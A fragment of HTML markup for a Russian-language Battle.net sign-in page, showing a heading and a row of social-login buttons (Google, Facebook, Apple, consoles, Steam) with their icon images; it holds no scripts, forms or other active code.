<!DOCTYPE html>

    <title>Авторизация в Battle.net</title>

            </div>
            <h1 id="page-title">Авторизоваться</h1>
            <div class="login-block">
                <button class="icon-button" id="google-button" title="Авторизоваться с помощью Google">
                    <img alt="image" class="icon-image" src="https://bnetaccount.akamaized.net/login/static/images/login/social/google-logo-color.svg"></img>
                </button>
                <button class="icon-button" id="facebook-button" title="Авторизоваться с помощью Facebook">
                    <img alt="image" class="icon-image" src="https://bnetaccount.akamaized.net/login/static/images/login/social/facebook-logo-white.svg"></img>
                </button>
                <button class="icon-button" id="apple-button" title="Авторизоваться с помощью Apple">
                    <img alt="image" class="icon-image" src="https://bnetaccount.akamaized.net/login/static/images/login/social/apple-logo-black.svg"></img>
                </button>
            </div>
            <div class="login-block">
                <button class="icon-button" id="xbox-button" title="Авторизоваться с помощью Xbox">

                </button>
                <button class="icon-button" id="playstation-button" title="Авторизоваться с помощью PlayStation">

                </button>
                <button class="icon-button" id="nintendo-button" title="Авторизоваться с помощью Nintendo">

                </button>
                <button class="icon-button" id="steam-button" title="Авторизоваться с помощью Steam">
                    <img alt="image" class="icon-image" src="https://bnetaccount.akamaized.net/login/static/images/login/social/steam-logo-black.svg">
                </button>
            </div>
            <div class="separator">

            </div>
